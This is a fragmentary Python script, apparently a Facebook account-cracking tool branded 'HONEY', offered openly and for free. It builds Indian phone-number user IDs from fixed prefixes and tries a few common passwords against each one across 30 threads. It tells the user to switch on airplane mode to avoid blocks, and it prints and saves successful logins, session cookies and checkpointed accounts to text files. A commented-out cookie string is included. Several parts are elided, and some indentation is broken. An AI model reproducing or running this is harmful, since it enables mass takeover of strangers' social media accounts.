...
\033[1;32m(•)==============================================🥀
\033[1;32m[🇮🇳] \033[1;33mCREATED BY   :  \033[1;33mHONEY
\033[1;32m[🇮🇳] \033[1;34mON FACEBOK   :  \033[1;34mHONEY
\033[1;32m[🇮🇳] \033[1;35mON GITHUB    :  \033[1;35mHONEY-X-ABHI-X-DEEP
\033[1;32m[🇮🇳] \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m[🇮🇳] \033[1;36mBEST FRIEND  :  \033[1;36mABHI X DEEP ☝️😍
\033[1;32m(•)==============================================💔\n\n"""  
loop = 0
oks = []
cps = []
...
def menu():
	...
	if opt =='1':
		random_crack()
	if opt =='2':
		os.system("xdg-open https://www.facebook.com/profile.php?id=100066857015594&mibextid=D4KYlr")
		menu()
    #if opt =='0':
    	#exit()
    #else:
...
def random_number():
	...
	os.system('clear')
	print(logo)
	print("\033[1;32m INDIA code : 6353,6354,6384,6345,6365")
	print(47*'-')
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print('\033[1;37;1m[•] CHOICE YOUR CONTORY :(\033[1;96mINDIA\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			pwx = [kode+guru,'57273200','6383','6355','6353','8948']
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=zfj1ZOJWOV-0z8-gFKtZ8Yok; sb=JwD2ZIb5x35E7tgFG9FFvD3d; fr=0WiJcuBC1isIUuPLY.AWX_2z5mTjwlt9lhgP26JYa-2fY.Bk9fjN.-K.AAA.0.0.Bk9gAp.AWUpwEL6_Zk',
    'dpr': '2',
    ...
    'user-agent': 'Mozilla/5.0(Linux;Android 14,Infinix X671B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome66.0.4011.172 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\033[1;92m[HONEY-OK] '+uid+' | '+ps+'\033[0;97m')
				print(f"\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('HONEY-ok.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\n\033[1;91m[HONEY-CP] '+uid+' | '+ps+'\033[0;97m')
				...
				continue
		loop+=1
		sys.stdout.write(f'\r\033[m[HONEY] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
		sys.stdout.flush()
	except:
		pass
    ...
    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0(Linux;Android 14,Infinix X671B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome66.0.4011.172 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[HONEY-CP] '+uid+' | '+ps+'\033[0;97m')
				#print(f"\n\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
				...
				continue
		loop+=1
		sys.stdout.write('\r[\033[1;92mHONEY\033[1;97m] [%s/%s]>[\033[1;32mOK\033[1;97m:-\033[1;92m%s\033[1;97m]-[CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
menu() 
